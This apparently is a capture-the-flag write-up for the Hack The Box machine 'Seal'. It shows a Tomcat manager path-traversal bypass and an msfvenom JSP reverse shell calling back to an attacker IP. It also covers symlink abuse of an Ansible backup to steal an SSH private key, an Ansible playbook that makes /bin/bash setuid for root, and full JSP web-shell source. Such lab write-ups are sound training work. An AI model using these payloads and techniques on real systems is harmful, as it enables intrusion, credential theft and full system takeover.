> Author: **[MrR3boot][author-profile]**

## Discovery

```bash
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
443/tcp  open  ssl/http   nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| ssl-cert: Subject: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
| Issuer: commonName=seal.htb/organizationName=Seal Pvt Ltd/stateOrProvinceName=London/countryName=UK
8080/tcp open  http-proxy
```

```bash
[Status: 200, Size: 4374, Words: 749, Lines: 85, Duration: 328ms]
| URL | https://10.10.10.250/manager/status.xsd
```

The seal market webpage uses cookies:

```javascript
// "{\"Version\":1,\"ViewThrough\":\"1\",\"XDomain\":\"1\"}"
decodeURIComponent('%7B%22Version%22%3A1%2C%22ViewThrough%22%3A%221%22%2C%22XDomain%22%3A%221%22%7D')
```

The sources are available on port 8080 via a BitBucket portal:

![][gitbucket-portal]

Quickly get to the meat:

![][tomcat-password]

## Break-in

Trying all the username visible on the feed:

![][gitbucket-feed]

> `luis` `42MrHBf*z8{Z%`

The former directory enumeration listed only the [manager page](https://seal.htb:443/manager/status).
The former credentials work here too (with tomcat as username).

Here I got a very strong pointer: under the "application" tab, there were a
few shady "revshell" and the like listed. IE I should aim to upload my own
shell application.

![][tomcat-shell-applications]

The mention `Apache Tomcat/9.0.31` begs googling: it suffers from a path
traversal vulnerability. So `https://seal.htb/manager/status/..;/html` leads
to the application manager html interface.

![][upload-tomcat-shell-application]

The shell was built with:

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.8 LPORT=9876 -f war -o heyhey.war
```

Still, the request fails with a "403" forbidden. Somehow, directing the request
to `jmxproxy` elevates our privileges:

![][tomcat-jmxproxy-request]

Then navigating to `/heyhey` does the trick.

## Lateral movement

Looking at the processes, there's an interesting backup running:

```
root      267159  0.0  0.0   2608   544 ?        Ss   12:52   0:00 /bin/sh -c sleep 30 && sudo -u luis /usr/bin/ansible-playbook /opt/backups/playbook/run.yml
```

```yaml
- hosts: localhost
  tasks:
  - name: Copy Files
    synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard dest=/opt/backups/files copy_links=yes
  - name: Server Backups
    archive:
      path: /opt/backups/files/
      dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-{{ansible_date_time.time}}.gz"
  - name: Clean
    file:
      state: absent
      path: /opt/backups/files/
```

```bash
# total 604K
# drwxrwxr-x 2 luis luis 4.0K Aug 28 12:55 .
# drwxr-xr-x 4 luis luis 4.0K Aug 28 12:55 ..
# -rw-rw-r-- 1 luis luis 596K Aug 28 12:55 backup-2021-08-28-12:55:33.gz 
ls -lah /opt/backups/archives/
```

Since the backup process copies links too, we just need to point to an
interesting file to have it in the archive. The process runs as `luis`, so the
most valuable file for this user would be his ssh key:

```bash
ln -s /home/luis/.ssh/ /var/lib/tomcat9/webapps/ROOT/admin/dashboard/uploads/
cd $(mktemp -d)
cp /opt/backups/archives/backup-2021-08-28-13:20:32.gz backup.gz
gzip -kd backup.gz
file backup
# backup: POSIX tar archive
tar -xvf backup
cd dashboard/uploads/.ssh/
cat id_rsa
```

Then copy the RSA key and use it with ssh.

## Escalation

So luis can run the former backup command as root. This time we can provide
the configuration:

```yaml
---
  - name: Flag
    hosts: localhost
    tasks:
      - name: Heyhey
        command: "chmod +s /bin/bash"
```

This RCE payload is inspired by [MiddlewareInventory][middlewareinventory].

Run the backup playbook and then `/bin/bash -p` to conclude.

## Bonus: building a war application

First create the `index.jsp`:

```jsp
<FORM METHOD=GET ACTION='index.jsp'>
<INPUT name='cmd' type=text>
<INPUT type=submit value='Run'>
</FORM>
<%@ page import="java.io.*" %>
<%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>
```

Then build:

```bash
mkdir webshell && mv index.jsp webshell/ && cd webshell/
jar -cvf heyhey.war index.jsp
```

[author-profile]: https://app.hackthebox.eu/users/13531
[gitbucket-feed]: images/gitbucket-feed.png
[gitbucket-portal]: images/gitbucket-portal.png
[middlewareinventory]: https://www.middlewareinventory.com/blog/ansible-command-examples/
[tomcat-jmxproxy-request]: images/tomcat-jmxproxy-request.png
[tomcat-password]: images/tomcat-password.png
[tomcat-shell-applications]: images/tomcat-shell-applications.png
[upload-tomcat-shell-application]: images/upload-tomcat-shell-application.png
